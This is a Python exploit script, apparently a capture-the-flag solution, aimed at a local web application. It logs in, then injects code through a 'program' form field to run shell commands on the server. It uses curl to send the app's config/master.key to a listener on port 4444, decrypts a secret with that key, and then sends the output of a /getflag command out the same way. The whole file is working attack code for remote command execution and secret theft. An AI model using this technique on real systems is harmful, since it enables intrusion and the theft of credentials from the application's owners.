import requests, secrets, subprocess
username = secrets.token_urlsafe(20)
password = secrets.token_urlsafe(20)
URL = "http://localhost:3000"
EXFIL = "http://localhost:4444"
s = requests.Session()

def get_auth_token(p):
    page = s.get(f"{URL}{p}").text
    return page.split('name="authenticity_token" value="')[1].split('"')[0]

# Login
s.post(f"{URL}/user/login", data={"authenticity_token": get_auth_token("/user/login"), "username": username, "password": password}).text

def run_cmd(cmd):
    payload = """
    42))
    print ['PAYLOAD'].pack('H*')
    exit
    # 
    """.strip().replace("PAYLOAD", subprocess.check_output(["ruby", "payload.rb", cmd]).decode().strip())
    s.post(f"{URL}", data={"authenticity_token": get_auth_token("/"), "program": payload})
    from pwn import listen
    l = listen(4444)
    l.wait_for_connection()
    l.shutdown("send")
    l.recvuntil(b"\r\n\r\n")
    res = l.recvall()
    return res

key = run_cmd(f"curl {EXFIL} -d @/app/config/master.key").decode().strip()

secret = subprocess.check_output(["ruby", "decrypt.rb", key]).decode().split()[-1]
print(secret)

flag = run_cmd(f"curl {EXFIL} -d `/getflag {secret}`")
print(flag)
